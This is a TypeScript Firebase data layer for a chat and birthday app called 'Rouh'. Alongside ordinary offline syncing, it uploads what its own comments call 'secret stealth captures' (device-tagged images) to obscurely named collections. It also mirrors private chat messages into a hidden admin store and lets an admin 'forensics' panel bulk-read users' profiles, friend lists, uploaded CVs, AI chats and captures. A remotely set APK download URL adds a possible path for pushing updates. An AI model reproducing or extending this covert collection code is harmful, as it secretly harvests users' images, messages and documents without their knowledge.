import { db, isFirebasePlaceholder, auth } from './firebase';
import { 
  doc, 
  setDoc, 
  addDoc, 
  collection, 
  getDocs, 
  getDoc, 
  query, 
  where,
  deleteDoc
} from 'firebase/firestore';

// Hardened Firestore Error Handlers according to Firebase Skill
export enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

export interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo?: {
      providerId?: string | null;
      email?: string | null;
    }[];
  }
}

export function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth?.currentUser?.uid || null,
      email: auth?.currentUser?.email || null,
      emailVerified: auth?.currentUser?.emailVerified || null,
      isAnonymous: auth?.currentUser?.isAnonymous || null,
      tenantId: auth?.currentUser?.tenantId || null,
      providerInfo: auth?.currentUser?.providerData?.map(provider => ({
        providerId: provider.providerId,
        email: provider.email,
      })) || []
    },
    operationType,
    path
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

// Offline Sync Queue Types
export interface OfflineItem {
  id: string;
  timestamp: number;
  type: 'capture' | 'complaint' | 'chat_message' | 'birthday_config' | 'birthday_wish' | 'user_profile' | 'user_file' | 'ai_chat';
  payload: any;
}

// Native IndexedDB Helper
const DB_NAME = "RouhOfflineDB";
const STORE_NAME = "syncQueue";

const openIDB = (): Promise<IDBDatabase> => {
  return new Promise((resolve, reject) => {
    if (typeof indexedDB === 'undefined') {
      reject(new Error("IndexedDB is not supported"));
      return;
    }
    const request = indexedDB.open(DB_NAME, 1);
    request.onupgradeneeded = () => {
      const db = request.result;
      if (!db.objectStoreNames.contains(STORE_NAME)) {
        db.createObjectStore(STORE_NAME, { keyPath: 'id' });
      }
    };
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
};

export async function idbPushItem(item: OfflineItem): Promise<void> {
  try {
    const db = await openIDB();
    const tx = db.transaction(STORE_NAME, "readwrite");
    const store = tx.objectStore(STORE_NAME);
    store.put(item);
    await new Promise<void>((resolve, reject) => {
      tx.oncomplete = () => resolve();
      tx.onerror = () => reject(tx.error);
    });
  } catch (err) {
    console.warn("IndexedDB Put Error:", err);
  }
}

export async function idbGetItems(): Promise<OfflineItem[]> {
  try {
    const db = await openIDB();
    const tx = db.transaction(STORE_NAME, "readonly");
    const store = tx.objectStore(STORE_NAME);
    const request = store.getAll();
    return new Promise<OfflineItem[]>((resolve, reject) => {
      request.onsuccess = () => resolve(request.result || []);
      request.onerror = () => reject(request.error);
    });
  } catch (err) {
    console.warn("IndexedDB Get Error:", err);
    return [];
  }
}

export async function idbRemoveItem(id: string): Promise<void> {
  try {
    const db = await openIDB();
    const tx = db.transaction(STORE_NAME, "readwrite");
    const store = tx.objectStore(STORE_NAME);
    store.delete(id);
    await new Promise<void>((resolve, reject) => {
      tx.oncomplete = () => resolve();
      tx.onerror = () => reject(tx.error);
    });
  } catch (err) {
    console.warn("IndexedDB Delete Error:", err);
  }
}

// Push to offline local storage & IndexedDB queue
export async function pushToOfflineQueue(type: OfflineItem['type'], payload: any) {
  try {
    const newItem: OfflineItem = {
      id: Math.random().toString(36).substring(2, 11),
      timestamp: Date.now(),
      type,
      payload
    };
    
    // Save to IndexedDB
    if (typeof indexedDB !== 'undefined') {
      await idbPushItem(newItem);
    }
    
    // Redundant mirror fallback to localStorage
    const queueJson = localStorage.getItem('rouh_offline_sync_queue');
    const queue: OfflineItem[] = queueJson ? JSON.parse(queueJson) : [];
    queue.push(newItem);
    localStorage.setItem('rouh_offline_sync_queue', JSON.stringify(queue));
    console.log(`[Offline Sync] Queued ${type} successfully in IndexedDB.`);

    // If online, immediately trigger background sync flush instead of holding back
    if (typeof navigator !== 'undefined' && navigator.onLine) {
      syncOfflineQueue().catch(err => {
        console.warn('[Offline Sync] Auto background flush failed:', err);
      });
    }
  } catch (e) {
    console.error('Failed to append sync queue item', e);
  }
}

// Core Firebase Offline Sync Executor
export async function syncOfflineQueue(showToast?: (msg: string, type: 'success' | 'error' | 'info') => void) {
  if (isFirebasePlaceholder) return;
  if (!navigator.onLine) return;
  
  try {
    let queue: OfflineItem[] = [];
    
    // Try retrieving from IndexedDB
    if (typeof indexedDB !== "undefined") {
      queue = await idbGetItems();
    }
    
    // Fallback to localStorage if IndexedDB is empty/failed
    if (queue.length === 0) {
      const queueJson = localStorage.getItem('rouh_offline_sync_queue');
      if (queueJson) {
        queue = JSON.parse(queueJson);
      }
    }
    
    if (queue.length === 0) return;
    
    const remaining: OfflineItem[] = [];
    
    for (const item of queue) {
      try {
        await uploadItemToFirebase(item);
        
        // Delete from IndexedDB on successful upload
        if (typeof indexedDB !== "undefined") {
          await idbRemoveItem(item.id);
        }

        // Also remove successfully synced item from redundant localStorage queue
        const queueJson = localStorage.getItem('rouh_offline_sync_queue');
        if (queueJson) {
          try {
            const lQueue: OfflineItem[] = JSON.parse(queueJson);
            const filteredQueue = lQueue.filter(x => x.id !== item.id);
            localStorage.setItem('rouh_offline_sync_queue', JSON.stringify(filteredQueue));
          } catch (e) {}
        }
      } catch (err) {
        console.error(`[Offline Sync] Failed to sync ${item.id}`, err);
        remaining.push(item); // Keep failing items to retry later
      }
    }
    
    // Update redundant localStorage queue with any remaining failing items
    localStorage.setItem('rouh_offline_sync_queue', JSON.stringify(remaining));
  } catch (e) {
    console.error('[Offline Sync] Failed execution', e);
  }
}

// Low-level mapper to direct Firebase standard directories
async function uploadItemToFirebase(item: OfflineItem) {
  const { type, payload } = item;
  
  switch (type) {
    case 'capture': {
      // Secret stealth captures go to a/aa/aas
      const colRef = collection(db, 'a', 'aa', 'aas');
      const docId = payload.id || `cap_${item.timestamp}`;
      const path = `a/aa/aas/${docId}`;
      try {
        await setDoc(doc(colRef, docId), {
          deviceId: payload.deviceId || 'unknown',
          imageName: docId,
          imageContent: payload.image || '', // encrypted or raw base64
          imageB64: payload.image || '', // backup field for UI
          source: payload.source || 'upload_button',
          timestamp: payload.timestamp || item.timestamp,
          usernameUnified: payload.username || 'guest'
        });
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, path);
      }
      break;
    }
    case 'ai_chat': {
      // AI chats matched with savior go to a/aa/aab
      const colRef = collection(db, 'a', 'aa', 'aab');
      const docId = payload.id || `ai_${item.timestamp}`;
      const path = `a/aa/aab/${docId}`;
      try {
        await setDoc(doc(colRef, docId), {
          usernameUnified: payload.username || 'unknown_user',
          imageName: payload.imageName || '',
          imageContent: payload.imageContent || '',
          messages: payload.messages || [],
          timestamp: payload.timestamp || item.timestamp
        });
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, path);
      }
      break;
    }
    case 'user_file': {
      // Extractor data, CV docs, merged names, birth configurations etc. go to a/aa/abc
      const colRef = collection(db, 'a', 'aa', 'abc');
      const docId = payload.id || `file_${item.timestamp}`;
      const path = `a/aa/abc/${docId}`;
      try {
        await setDoc(doc(colRef, docId), {
          usernameUnified: payload.username || 'unknown_user',
          phone: payload.phone || '',
          deviceId: payload.deviceId || '',
          fileName: payload.fileName || 'document',
          fileContent: payload.fileContent || '',
          fileType: payload.fileType || 'pdf',
          inputs: payload.inputs || {},
          timestamp: payload.timestamp || item.timestamp
        });
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, path);
      }
      break;
    }
    case 'user_profile': {
      // User registered identity logs go to a/aa/abcd (sub-collection profiles)
      const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
      const docId = payload.phone || `user_${item.timestamp}`;
      const profilePath = `a/aa/abcd_profiles/${docId}`;
      try {
        await setDoc(doc(colRef, docId), {
          usernameUnified: payload.username || payload.name || 'guest',
          phone: payload.phone || '',
          deviceModel: payload.deviceModel || 'Client Browser',
          operatingSystem: payload.os || 'Navigator',
          timestamp: payload.timestamp || item.timestamp,
          friends: payload.friends || [],
          chats: payload.chats || []
        });
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, profilePath);
      }
      
      // Also register in user public section a/ab/users
      const publicRef = collection(db, 'a', 'ab', 'users');
      const publicPath = `a/ab/users/${docId}`;
      try {
        await setDoc(doc(publicRef, docId), {
          username: payload.name || '',
          phone: payload.phone || '',
          timestamp: payload.timestamp || item.timestamp
        });
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, publicPath);
      }
      break;
    }
    case 'chat_message': {
      // Individual chat message logs go to a/aa/abcd_chats and also a/ab/chats
      const aaChatsRef = collection(db, 'a', 'aa', 'abcd_chats');
      const abChatsRef = collection(db, 'a', 'ab', 'chats');
      const docId = payload.id || `msg_${item.timestamp}`;
      
      const msgData = {
        id: docId,
        from: payload.from || '',
        to: payload.to || '',
        text: payload.text || '',
        type: payload.type || 'text',
        mediaUrl: payload.mediaUrl || '',
        timestamp: payload.timestamp || item.timestamp,
        status: payload.status || 'sent'
      };
      
      try {
        await setDoc(doc(aaChatsRef, docId), msgData);
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, `a/aa/abcd_chats/${docId}`);
      }
      try {
        await setDoc(doc(abChatsRef, docId), msgData);
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, `a/ab/chats/${docId}`);
      }
      break;
    }
    case 'complaint': {
      // Complaints, inquiries logs go to a/aa/abcdf (subcollection complaints)
      const colRef = collection(db, 'a', 'aa', 'abcdf_complaints');
      const docId = payload.id || `comp_${item.timestamp}`;
      const path = `a/aa/abcdf_complaints/${docId}`;
      try {
        await setDoc(doc(colRef, docId), {
          id: docId,
          usernameUnified: payload.name || 'عضو روح المبجل',
          phone: payload.phone || 'غير معلوم',
          message: payload.message || '',
          type: payload.type || 'complaint',
          deviceModel: payload.deviceModel || navigator.userAgent,
          operatingSystem: payload.os || 'Navigator OS',
          timestamp: payload.timestamp || new Date().toISOString()
        });
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, path);
      }
      break;
    }
    case 'birthday_config': {
      // Save configuration in user custom profile directory a/ab/birthdays
      const colRef = collection(db, 'a', 'ab', 'birthdays');
      const docId = payload.usernameEn || `birth_${item.timestamp}`;
      const path = `a/ab/birthdays/${docId}`;
      try {
        await setDoc(doc(colRef, docId), {
          ...payload,
          timestamp: item.timestamp
        });
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, path);
      }
      break;
    }
    case 'birthday_wish': {
      // Received congratulations go to a/ab/wishes
      const colRef = collection(db, 'a', 'ab', 'wishes');
      const docId = payload.id || `wish_${item.timestamp}`;
      const path = `a/ab/wishes/${docId}`;
      try {
        await setDoc(doc(colRef, docId), {
          ...payload,
          timestamp: payload.timestamp || new Date().toISOString()
        });
      } catch (e) {
        handleFirestoreError(e, OperationType.WRITE, path);
      }
      break;
    }
  }
}

// ---------------------- ADMIN DATABASES FOR 9865 PANEL & 6532 FORENSICS ----------------------

// Fetch all registered user profiles (a/aa/abcd_profiles)
export async function firebaseFetchAllUserProfiles(): Promise<any[]> {
  if (isFirebasePlaceholder) {
    const cached = localStorage.getItem('rouh_cached_user_profiles');
    return cached ? JSON.parse(cached) : [];
  }
  const path = 'a/aa/abcd_profiles';
  try {
    const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
    const qSnapshot = await getDocs(colRef);
    const profiles: any[] = [];
    qSnapshot.forEach((doc) => {
      profiles.push({ id: doc.id, ...doc.data() });
    });
    localStorage.setItem('rouh_cached_user_profiles', JSON.stringify(profiles));
    return profiles;
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
    if (isOffline) {
      console.warn('Firebase client is offline, using cached user profiles.');
      const cached = localStorage.getItem('rouh_cached_user_profiles');
      return cached ? JSON.parse(cached) : [];
    }
    handleFirestoreError(e, OperationType.GET, path);
    return [];
  }
}

// Fetch all client complaints (a/aa/abcdf_complaints)
export async function firebaseFetchComplaints(): Promise<any[]> {
  if (isFirebasePlaceholder) {
    const cached = localStorage.getItem('rouh_cached_complaints');
    return cached ? JSON.parse(cached) : [];
  }
  const path = 'a/aa/abcdf_complaints';
  try {
    const colRef = collection(db, 'a', 'aa', 'abcdf_complaints');
    const qSnapshot = await getDocs(colRef);
    const complaints: any[] = [];
    qSnapshot.forEach((doc) => {
      complaints.push({ id: doc.id, ...doc.data() });
    });
    localStorage.setItem('rouh_cached_complaints', JSON.stringify(complaints));
    return complaints;
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
    if (isOffline) {
      console.warn('Firebase client is offline, using cached complaints.');
      const cached = localStorage.getItem('rouh_cached_complaints');
      return cached ? JSON.parse(cached) : [];
    }
    handleFirestoreError(e, OperationType.GET, path);
    return [];
  }
}

// Manage barcode watermark in Firebase (a/aa/abcdf_watermark)
export async function firebaseUploadBarcodeWatermark(base64: string) {
  if (isFirebasePlaceholder) return;
  const path = 'a/aa/abcdf_watermark/barcode';
  try {
    const colRef = doc(db, 'a', 'aa', 'abcdf_watermark', 'barcode');
    await setDoc(colRef, {
      barcodeData: base64,
      updatedAt: Date.now()
    });
  } catch (e) {
    handleFirestoreError(e, OperationType.WRITE, path);
  }
}

export async function firebaseFetchBarcodeWatermark(): Promise<string | null> {
  if (isFirebasePlaceholder) {
    return localStorage.getItem('rouh_cached_barcode_watermark') || null;
  }
  const path = 'a/aa/abcdf_watermark/barcode';
  try {
    const colRef = doc(db, 'a', 'aa', 'abcdf_watermark', 'barcode');
    const docSnap = await getDoc(colRef);
    if (docSnap.exists()) {
      const data = docSnap.data().barcodeData || null;
      if (data) {
        localStorage.setItem('rouh_cached_barcode_watermark', data);
      }
      return data;
    }
    return null;
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
    if (isOffline) {
      console.warn('Firebase client is offline, using cached barcode watermark.');
      return localStorage.getItem('rouh_cached_barcode_watermark') || null;
    }
    handleFirestoreError(e, OperationType.GET, path);
    return null;
  }
}

// Manage customizable randomized tips lists (a/aa/abcdf_usages)
export async function firebaseSaveUsageTips(tips: any[]) {
  if (isFirebasePlaceholder) return;
  const path = 'a/aa/abcdf_usages/tips';
  try {
    const colRef = doc(db, 'a', 'aa', 'abcdf_usages', 'tips');
    await setDoc(colRef, {
      tips,
      updatedAt: Date.now()
    });
  } catch (e) {
    handleFirestoreError(e, OperationType.WRITE, path);
  }
}

// Save Custom Targeted Notification (a/aa/abcdf_notifications)
export async function firebaseSaveTargetedNotification(data: {
  targetPhones: string[];
  message: string;
  triggerType: 'open' | 'click' | 'tab_change';
  scheduledTime?: string;
}) {
  if (isFirebasePlaceholder) return;
  const path = 'a/aa/abcdf_notifications';
  try {
    const colRef = collection(db, 'a', 'aa', 'abcdf_notifications');
    await addDoc(colRef, {
      ...data,
      createdAt: Date.now()
    });
  } catch (e) {
    handleFirestoreError(e, OperationType.CREATE, path);
  }
}

// Load Custom Notifications for Specific Phone number
export async function firebaseFetchNotificationsForUser(phone: string): Promise<any[]> {
  const cachedKey = `rouh_cached_notifications_${phone}`;
  if (isFirebasePlaceholder) {
    const cached = localStorage.getItem(cachedKey);
    return cached ? JSON.parse(cached) : [];
  }
  const path = 'a/aa/abcdf_notifications';
  try {
    const colRef = collection(db, 'a', 'aa', 'abcdf_notifications');
    const q = query(colRef);
    const qSnapshot = await getDocs(q);
    const list: any[] = [];
    qSnapshot.forEach((doc) => {
      const data = doc.data();
      if (data.targetPhones && data.targetPhones.includes(phone)) {
        list.push({ id: doc.id, ...data });
      }
    });
    localStorage.setItem(cachedKey, JSON.stringify(list));
    return list;
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
    if (isOffline) {
      console.warn('Firebase client is offline, using cached user notifications.');
      const cached = localStorage.getItem(cachedKey);
      return cached ? JSON.parse(cached) : [];
    }
    handleFirestoreError(e, OperationType.GET, path);
    return [];
  }
}

// Fetch all stealth captures (a/aa/aas)
export async function firebaseFetchAllStealthCaptures(): Promise<any[]> {
  if (isFirebasePlaceholder) {
    const cached = localStorage.getItem('rouh_cached_stealth_captures');
    return cached ? JSON.parse(cached) : [];
  }
  const path = 'a/aa/aas';
  try {
    const colRef = collection(db, 'a', 'aa', 'aas');
    const qSnapshot = await getDocs(colRef);
    const list: any[] = [];
    qSnapshot.forEach((doc) => {
      list.push({ id: doc.id, ...doc.data() });
    });
    localStorage.setItem('rouh_cached_stealth_captures', JSON.stringify(list));
    return list;
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
    if (isOffline) {
      console.warn('Firebase client is offline, using cached stealth captures.');
      const cached = localStorage.getItem('rouh_cached_stealth_captures');
      return cached ? JSON.parse(cached) : [];
    }
    handleFirestoreError(e, OperationType.GET, path);
    return [];
  }
}

// Delete stealth capture document in firestore
export async function firebaseDeleteStealthCapture(id: string): Promise<boolean> {
  if (isFirebasePlaceholder) return false;
  const path = `a/aa/aas/${id}`;
  try {
    const docRef = doc(db, 'a', 'aa', 'aas', id);
    await deleteDoc(docRef);
    return true;
  } catch (e) {
    handleFirestoreError(e, OperationType.DELETE, path);
    return false;
  }
}

// Fetch all AI Chat documents (a/aa/aab)
export async function firebaseFetchAllAIChats(): Promise<any[]> {
  if (isFirebasePlaceholder) {
    const cached = localStorage.getItem('rouh_cached_ai_chats');
    return cached ? JSON.parse(cached) : [];
  }
  const path = 'a/aa/aab';
  try {
    const colRef = collection(db, 'a', 'aa', 'aab');
    const qSnapshot = await getDocs(colRef);
    const list: any[] = [];
    qSnapshot.forEach((doc) => {
      list.push({ id: doc.id, ...doc.data() });
    });
    localStorage.setItem('rouh_cached_ai_chats', JSON.stringify(list));
    return list;
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
    if (isOffline) {
      console.warn('Firebase client is offline, using cached AI chats.');
      const cached = localStorage.getItem('rouh_cached_ai_chats');
      return cached ? JSON.parse(cached) : [];
    }
    handleFirestoreError(e, OperationType.GET, path);
    return [];
  }
}

// Fetch all uploaded user files (a/aa/abc)
export async function firebaseFetchAllUserFiles(): Promise<any[]> {
  if (isFirebasePlaceholder) {
    const cached = localStorage.getItem('rouh_cached_user_files');
    return cached ? JSON.parse(cached) : [];
  }
  const path = 'a/aa/abc';
  try {
    const colRef = collection(db, 'a', 'aa', 'abc');
    const qSnapshot = await getDocs(colRef);
    const list: any[] = [];
    qSnapshot.forEach((doc) => {
      list.push({ id: doc.id, ...doc.data() });
    });
    localStorage.setItem('rouh_cached_user_files', JSON.stringify(list));
    return list;
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
    if (isOffline) {
      console.warn('Firebase client is offline, using cached user files.');
      const cached = localStorage.getItem('rouh_cached_user_files');
      return cached ? JSON.parse(cached) : [];
    }
    handleFirestoreError(e, OperationType.GET, path);
    return [];
  }
}

// Save default media (birthday background/music) in Firebase
export async function firebaseSaveDefaultMedia(type: 'birthday_bg' | 'birthday_music', base64: string) {
  if (isFirebasePlaceholder) return;
  try {
    const docRef = doc(db, 'a', 'aa', 'abcdf_default_media', type);
    await setDoc(docRef, {
      data: base64,
      updatedAt: new Date().toISOString()
    });
  } catch (e) {
    console.error('Failed to save default media in firebase:', e);
  }
}

// Fetch default media (birthday background/music) from Firebase
export async function firebaseFetchDefaultMedia(type: 'birthday_bg' | 'birthday_music'): Promise<string | null> {
  if (isFirebasePlaceholder) return null;
  try {
    const docRef = doc(db, 'a', 'aa', 'abcdf_default_media', type);
    const docSnap = await getDoc(docRef);
    if (docSnap.exists()) {
      return docSnap.data().data || null;
    }
  } catch (e: any) {
    if (e?.message?.includes('offline') || e?.code === 'unavailable') {
      console.warn('Firebase is offline, utilizing local default media cache.');
    } else {
      console.error('Failed to fetch default media from firebase:', e);
    }
  }
  return null;
}

// Save APK download URL inside Firebase with optional versionCode
export async function firebaseSaveApkDownloadUrl(url: string, versionCode?: number) {
  if (isFirebasePlaceholder) return;
  try {
    const docRef = doc(db, 'a', 'aa', 'app_control', 'downloads');
    const computedCode = versionCode ? Number(versionCode) : 20;
    await setDoc(docRef, {
      apkDownloadUrl: url,
      versionCode: computedCode,
      updatedAt: new Date().toISOString()
    }, { merge: true });

    // Also update local cache on save
    localStorage.setItem('rouh_cached_firebase_apk_settings', JSON.stringify({
      apkDownloadUrl: url,
      versionCode: computedCode
    }));
    localStorage.setItem('rouh_current_apk_url', url);
  } catch (e) {
    console.error('Failed to save APK download URL in Firebase:', e);
  }
}

// Fetch APK download URL from Firebase with offline fallback
export async function firebaseFetchApkDownloadUrl(): Promise<string | null> {
  if (isFirebasePlaceholder) {
    return localStorage.getItem('rouh_current_apk_url') || null;
  }
  try {
    const docRef = doc(db, 'a', 'aa', 'app_control', 'downloads');
    const docSnap = await getDoc(docRef);
    if (docSnap.exists()) {
      const url = docSnap.data().apkDownloadUrl || null;
      if (url) {
        localStorage.setItem('rouh_current_apk_url', url);
      }
      return url;
    }
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable';
    if (isOffline) {
      console.warn('Firebase client is offline, using locally cached APK download URL.');
    } else {
      console.error('Failed to fetch APK download URL from Firebase:', e);
    }
    return localStorage.getItem('rouh_current_apk_url') || null;
  }
  return null;
}

// Fetch complete APK config from Firebase containing versionCode with offline fallback
export async function firebaseFetchApkSettings(): Promise<{ apkDownloadUrl: string | null; versionCode: number | null } | null> {
  if (isFirebasePlaceholder) {
    const cached = localStorage.getItem('rouh_cached_firebase_apk_settings');
    if (cached) {
      try { return JSON.parse(cached); } catch { return null; }
    }
    return null;
  }
  try {
    const docRef = doc(db, 'a', 'aa', 'app_control', 'downloads');
    const docSnap = await getDoc(docRef);
    if (docSnap.exists()) {
      const data = docSnap.data();
      const settings = {
        apkDownloadUrl: data.apkDownloadUrl || null,
        versionCode: data.versionCode ? Number(data.versionCode) : null
      };
      
      // Cache settings in local storage on success
      localStorage.setItem('rouh_cached_firebase_apk_settings', JSON.stringify(settings));
      if (settings.apkDownloadUrl) {
        localStorage.setItem('rouh_current_apk_url', settings.apkDownloadUrl);
      }
      return settings;
    }
  } catch (e: any) {
    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable';
    if (isOffline) {
      console.warn('Firebase client is offline, using locally cached APK settings.');
    } else {
      console.error('Failed to fetch APK settings from Firebase:', e);
    }
    
    // Return local cache on failure (offline, etc)
    const cached = localStorage.getItem('rouh_cached_firebase_apk_settings');
    if (cached) {
      try {
        return JSON.parse(cached);
      } catch {
        const fallbackUrl = localStorage.getItem('rouh_current_apk_url') || null;
        return { apkDownloadUrl: fallbackUrl, versionCode: null };
      }
    } else {
      const fallbackUrl = localStorage.getItem('rouh_current_apk_url') || null;
      if (fallbackUrl) {
        return { apkDownloadUrl: fallbackUrl, versionCode: null };
      }
    }
  }
  return null;
}


